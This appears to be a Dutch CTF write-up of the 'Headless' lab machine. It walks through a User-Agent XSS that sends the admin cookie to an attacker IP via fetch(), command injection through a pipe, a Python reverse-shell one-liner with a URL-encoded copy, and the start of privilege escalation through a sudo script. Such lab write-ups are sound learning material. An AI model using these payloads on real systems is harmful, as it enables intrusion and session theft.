# Headless

Het lijkt er op dat poort 5000 open staat. Op deze poort is een _"site will be
live in 24d"_ melding te zien. Daarnaast is er een `/support` pagina met een
formulier.

Een snelle ffuf dir scan levert niet heel veel meer op.

# Het formulier

Ik zie geen _reflected_ waardes, template injection "kan" maar is lastig uit te
zoeken. SQLI klinkt op dit moment een logischere hack.

`sqlmap` Levert niet gelijk iets op.

# Burpyburp

Als ik door de request en cookie data pluis dan zie ik een hele mooie
`is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs` cookie. Dit voelt heel duidelijk
als een mooie om mee te prutsen.

Het eerste gedeelte `InVzZXTi` mapped qua base64 heel mooi naar `"user"`

# XSS

Het cookie kwam ik niet uit. Wat wel opviel is dat bij een template injection
via `{{ 7*7 }}` ik op een nieuwe pagina terecht kwam. Eentje met een _je bent
een hakker harry_ melding. Hier word de user-agent zonder escaping in de dom
gegooid. Nog beter is dat er een job op de achtergrond draait waarbij deze
pagina geopend wordt.

We kunnen waarschijnlijk dus de admin cookie jatten.

```js
User-Agent: <script>fetch("http://10.10....:9002/" + btoa(document.cookie))</script>
```

en we hebben een response

```
aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=

// vertaald

is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

# Fluffer

Een `ffuf` call met deze cookie gezet en we vinden een nieuwe pagina. Namelijk
`/dashboard`

# Command injection

We hebben hier geen output wat er precies gebeurd. Wel een mogelijke error
waarbij soms wel en soms niet de data toont dat er iets gebeurt. Hier het
volgende geprobeerd.

- SSTI met `{{ import time; time.sleep(5) }}`
- SSTI met `import time; time.sleep(5)`
- command injection `ls && cd`
- command injection met een `|`

Die laatste bleek uiteindelijk te werken.

> Note to self, bij geen output gebruik gelijk een `curl 'ip:port'` om te
> valideren of we command execution hebben. Toch makkelijker, andere optie is om
> `sleep 3` als injectie command te gebruiken.

# Foothold

Met het volgende script foothold gekregen:

```
2023-01-01;export RHOST="10.10.14.231";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'

// Of geencode voor urls

%32%30%32%33%2d%30%31%2d%30%31%3b%65%78%70%6f%72%74%20%52%48%4f%53%54%3d%22%31%30%2e%31%30%2e%31%34%2e%32%33%31%22%3b%65%78%70%6f%72%74%20%52%50%4f%52%54%3d%39%30%30%31%3b%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%48%4f%53%54%22%29%2c%69%6e%74%28%6f%73%2e%67%65%74%65%6e%76%28%22%52%50%4f%52%54%22%29%29%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%62%61%73%68%22%29%27
```

# Wie ben ik

Ik ben `dvir`

```
bash-5.2$ whoami
dvir
bash-5.2$ groups
dvir users
bash-5.2$ uname -a
Linux headless 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
bash-5.2$
```

# Sudo -l

Sudo -l geeft een mooi bashscript aan die we als root uit kunnen voeren. Dit
voelt als een goede start voor privesc.

Ok dit is wel heel makkelijk. Dit script roept `initdb.sh` aan vanuit de folder
waar je momenteel zit. Nou tijd voor nog een revshell.
